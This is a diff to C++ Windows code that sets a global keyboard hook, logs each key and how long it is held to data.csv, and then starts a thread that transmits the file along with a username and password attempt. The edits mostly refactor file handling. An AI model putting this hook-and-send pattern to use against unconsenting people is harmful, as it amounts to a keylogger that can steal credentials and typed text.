@@ -39,10 +39,11 @@ DWORD lastAction = 0x0;
 DWORD* keyDuration = new DWORD[253];
 std::string* stringStore = new std::string[253];
 //FILE* fp;
-std::fstream fp;
+std::fstream *fp;
 
 
 int lineCount = 0;
+int lastData_size = 0;
 bool FirstEntry = true;
 DWORD prevKey = 0x0;
 
@@ -112,13 +113,13 @@ int main()
 	//}
 	}
 
-	if (fp.is_open())
+	if (fp->is_open())
 	{
-		fp.close();
+		fp->close();
 		printf("[*] - File wasn't closed... Closing...\n");
 	}
 
-	printf("\n[*] - Beginning file trasmission...\n");
+	printf("\n[*] - Beginning file transmission...\n");
 
 	std::thread fileTransferThread(begin_file_transfer, userName, passAttempt);
 	printf("[*] - Waiting on thread...\n");
@@ -137,8 +138,8 @@ static void initialize_hook_thread()
 
 	//printf("[Thread]: 0x%08x started...\n", GetCurrentThreadId());
 
-	fp = std::fstream("data.csv", std::fstream::trunc);
-	if (!fp.is_open())
+	fp = new std::fstream("data.csv", std::fstream::trunc);
+	if (!fp->is_open())
 	{
 		printf("[!] - An error occured opening data.csv :(\n");
 		FILE *file;
@@ -155,7 +156,7 @@ static void initialize_hook_thread()
 		{
 			fclose(file);
 			printf("[+] - Closed creating file handle, opening again with fstream...\n");
-			fp.open("data.csv", std::fstream::trunc);
+			fp->open("data.csv", std::fstream::trunc);
 		}
 	}
 
@@ -170,7 +171,7 @@ static void initialize_hook_thread()
 	{
 		printf("[!!] - There was an error starting SetWindowsHookEx\n");
 		printf("[GLE]: 0x%08x\n", GetLastError());
-		fp.close();
+		fp->close();
 		delete[] keyDuration;
 		ExitThread(100);
 	}
@@ -183,7 +184,7 @@ static void initialize_hook_thread()
 	}
 
 
-	fp.close();
+	fp->close();
 	UnhookWindowsHookEx(myKbHook);
 	delete[] keyDuration;
 	ExitThread(100);
@@ -193,6 +194,10 @@ static void initialize_hook_thread()
 
 void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 {
+	if (!fp->is_open())
+	{
+		fp->open("data.csv", std::fstream::out);
+	}
 	UINT mapKey = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
 	if (mapKey == 0)
 	{
@@ -209,7 +214,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 	case VK_BACK:
 	{
 		// When this is found, we will delete the last line in the file.
-		//std::getline(fp, std::fstream::end);
+		//std::getline(fp, lineCount);
 		break;
 	}
 	case VK_LWIN:
@@ -277,8 +282,15 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 
 		stringStore[vkCode] += '\n';
 		//printf("[KEYSTORE %d] : %s\n", vkCode, stringStore[vkCode].c_str());
-		fp.write(stringStore[vkCode].c_str(), stringStore[vkCode].size()); // Write it to the data.txt file.
-		stringStore[vkCode].clear(); // Empty out our string buffer for a new character at that location.
+		if (fp->is_open())
+		{
+			//printf("[DEBUG]: %s\n", stringStore[vkCode].c_str());
+			fp->write(stringStore[vkCode].c_str(), stringStore[vkCode].size()); // Write it to the data.txt file.
+			//printf("Written\n");
+			lineCount++;
+			lastData_size = stringStore[vkCode].size();
+			stringStore[vkCode].clear(); // Empty out our string buffer for a new character at that location.
+		}
 		//stringStore[vkCode].em
 		//stringStore[vkCode] = "";
 
@@ -638,6 +650,6 @@ std::string readWholeFile()
 
 		delete[] buffer;
 	}
-
+	sendFile.close();
 	return wholeFile;
 }
